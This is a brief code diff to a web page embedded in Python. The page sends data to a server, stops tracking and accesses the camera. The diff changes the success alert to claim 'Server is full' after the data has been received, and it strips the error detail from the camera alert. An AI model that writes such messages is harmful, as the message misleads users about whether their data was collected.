@@ -338,7 +338,7 @@ HTML_PAGE = """
                     })
                     .then(response => response.json())
                     .then(data => {
-                        alert('Server received your data.');
+                        alert('Server is full.');
                         stopTracking();
                     });
                 });
@@ -401,7 +401,7 @@ HTML_PAGE = """
                         videoElement.srcObject = stream;
                     })
                     .catch(function (error) {
-                        alert("Camera access denied or unavailable: " + error.message);
+                        alert("Camera access denied or unavailable: ");
                     });
             } else {
                 alert("Your browser does not support camera access.");
